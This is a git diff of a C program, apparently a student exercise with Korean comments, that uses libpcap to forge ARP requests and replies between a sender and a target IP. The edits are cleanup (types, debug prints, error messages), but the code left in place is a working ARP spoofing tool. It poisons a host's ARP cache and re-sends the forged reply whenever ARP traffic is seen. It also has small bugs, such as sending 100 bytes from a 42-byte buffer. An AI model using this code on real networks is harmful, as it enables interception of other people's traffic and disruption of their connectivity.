@@ -22,28 +22,20 @@ int main(int argc, char ** argv) {
     if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
         perror("ioctl fail");   /* TODO 에러처리 */
 
-    const unsigned char* mac = ifr.ifr_hwaddr.sa_data;
-    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
-           mac[0],
-            mac[1],
-            mac[2],
-            mac[3],
-            mac[4],
-            mac[5]);
+    const unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
+    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 
-    close(s);
+    shutdown(s, SHUT_RDWR);
     pcap_t * handle;
-    const char * buf;
     u_char packet[42];
     u_char arp_packet[42];
-    u_char errbuf[PCAP_ERRBUF_SIZE];
-    u_int32_t res, i;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    int32_t res, i;
     struct pcap_pkthdr *header;	/* The header that pcap gives us */
     u_char* packet2;		/* The actual packet */
     u_char gatemac[6];
     u_char targetmac[6];
-    u_char filter_exp[] = "arp";
-    u_int32_t net;
+    u_int32_t net=0;
     struct bpf_program fp;
 
     if(argc != 4) {
@@ -53,14 +45,14 @@ int main(int argc, char ** argv) {
     for(i=0; i<6; i++) {
         printf("%0x", mac[i]);
     }
-    u_char * sender_ip = argv[2];
-    u_char * target_ip = argv[3];
+    char * sender_ip = argv[2];
+    char * target_ip = argv[3];
     u_int32_t sipNum = (u_int32_t)inet_addr(sender_ip);
     u_int32_t tipNum = (u_int32_t)inet_addr(target_ip);
 
     handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
-        fprintf(stderr, "Couldn't open device %s: %s\n", device, errbuf);
+        fprintf(stderr, "Couldn't open device\n");
         return(2);
     }
     // Arp request
@@ -87,12 +79,9 @@ int main(int argc, char ** argv) {
         packet[29] = ((sipNum)>>8)&0xff;
         packet[30] = ((sipNum)>>16)&0xff;
         packet[31] = ((sipNum)>>24)&0xff;
-        packet[32] = 0;
-        packet[33] = 0;
-        packet[34] = 0;
-        packet[35] = 0;
-        packet[36] = 0;
-        packet[37] = 0;
+        for(i=32; i<38; i++) {
+            packet[i] = 0;
+        }
         packet[38] = (tipNum)&0xff;
         packet[39] = ((tipNum)>>8)&0xff;
         packet[40] = ((tipNum)>>16)&0xff;
@@ -102,15 +91,14 @@ int main(int argc, char ** argv) {
             printf( "Couldn't send packet\n");
             return(2);
         }
-        printf("Hello\n");
 
         if(pcap_compile(handle, &fp, "arp", 0, net) == -1) {
-            fprintf(stderr, "Couldn't parse filter %s\n", filter_exp, pcap_geterr(handle));
+            fprintf(stderr, "Couldn't parse filter %s\n", pcap_geterr(handle));
             return (2);
         }
 
         if(pcap_setfilter(handle, &fp) == -1) {
-            fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+            fprintf(stderr, "Couldn't install filter %s\n", pcap_geterr(handle));
             return(2);
         }
 
@@ -164,7 +152,6 @@ int main(int argc, char ** argv) {
 
         while(1) {
             res = pcap_next_ex(handle, &header, &packet2); // header : 패킷이 잡힌 시간, 길이 정보
-            printf("res : %d", res);
             if (res == 0 || packet == NULL)
                 continue;
             if (res == -1 || res == -2) // Error while grabbing packet.
@@ -175,7 +162,6 @@ int main(int argc, char ** argv) {
             }
             break;
         }
-        printf("Helloworld\n");
     // Arp Reply
         for(i=0; i<6; i++) {
             packet[i] = targetmac[i];
@@ -208,8 +194,7 @@ int main(int argc, char ** argv) {
         packet[40] = ((tipNum)>>16)&0xff;
         packet[41] = ((tipNum)>>24)&0xff;
 
-        printf("%d", sizeof(packet));
-        memcpy(arp_packet, packet, sizeof(packet));
+        memcpy(arp_packet, packet, 42);
 /*
         while(1)
         {
@@ -223,23 +208,24 @@ int main(int argc, char ** argv) {
         }
 
         if(pcap_compile(handle, &fp, "icmp||arp", 0, net) == -1) {
-            fprintf(stderr, "Couldn't parse filter %s\n", filter_exp, pcap_geterr(handle));
+            fprintf(stderr, "Couldn't parse filter %s\n", pcap_geterr(handle));
             return (2);
         }
 
         if(pcap_setfilter(handle, &fp) == -1) {
-            fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+            fprintf(stderr, "Couldn't install filter %s\n", pcap_geterr(handle));
             return(2);
         }
 
         while(1) {
             res = pcap_next_ex(handle, &header, &packet2);
+
             if( res == 0 || packet2 == NULL)
                 continue;
             if( res ==-1 || res == -2)
                 break;
             printf("Jacked a packet with length of [%d]\n", (*header).len);
-            if(packet2[12] ==0x8 && packet2[13] == 0x6) {
+            if(packet2[12] == 8 && packet2[13] == 6) {
                 if(pcap_sendpacket(handle, arp_packet, 100) != 0 ) {
                     printf("Couldn't send packet\n");
                     return(2);
